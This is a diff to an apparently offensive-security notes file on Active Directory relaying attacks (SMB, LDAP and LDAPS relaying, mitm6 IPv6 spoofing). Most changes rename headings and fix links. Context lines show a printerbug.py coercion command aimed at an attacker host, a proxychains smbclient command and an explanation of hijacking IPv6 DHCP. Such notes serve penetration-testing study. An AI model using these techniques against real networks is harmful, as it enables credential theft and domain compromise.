@@ -1,7 +1,8 @@
 ## Relaying attacks
-* [SMB relaying](#SMB relaying)
-* [LDAP Relaying](#LDAP Relaying)
-* [Mitm6](#Mitm6)
+* [SMB relaying](#SMB-relaying)
+* [LDAP Relaying](#LDAP-Relaying)
+  * [LDAP Relay force HTTP requests](#LDAP-Relay-force-HTTP-requests)
+  * [LDAP Relay with Mitm6](#LDAP-Relay-with-Mitm6)
 * [LDAPS Relaying](#LDAPS Relaying)
   * [Resource Based Constrained Delegation Webclient Attack](#Resource Based Constrained Delegation Webclient Attack)
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
@@ -54,7 +55,7 @@ proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 ```
 
 ### LDAP Relaying
-### Relay requests LDAP
+### LDAP Relay force HTTP requests
 - Requires HTTP requests, because SMB signing is enabled by default.
 
 #### Scan for target with webclient active
@@ -100,7 +101,7 @@ python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
 
 - However, since printerbug and PetitPotam both needed authentication to work, we could have just used a tool like ldapdomaindump to directly bind to LDAP ourselves and dump the data directly. To do this unauthenticated use mitm6!
 
-### Mitm6
+### LDAP Relay with Mitm6
 - In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
 - However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
 - Spoof any requests for internal resources
